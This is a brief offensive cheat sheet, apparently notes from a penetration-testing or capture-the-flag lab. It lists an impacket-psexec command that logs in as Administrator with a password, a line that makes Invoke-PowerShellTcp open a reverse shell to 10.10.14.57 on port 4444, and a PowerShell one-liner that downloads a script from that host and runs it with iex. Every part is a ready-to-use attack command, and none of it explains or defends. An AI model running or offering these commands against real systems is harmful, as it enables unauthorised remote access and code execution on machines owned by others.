# PSExec

```sh
impacket-psexec Administrator:'<password>'@$target
```

# PowerShell Reverse Shell

`Invoke-PowerShellTcp.ps1`

Add this line at the end of the script:

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.57 -Port 4444
```

On target:

```powershell
powershell iex(new-object net.webclient).downloadstring(\"http://10.10.14.57:8000/reverse.ps1\")
```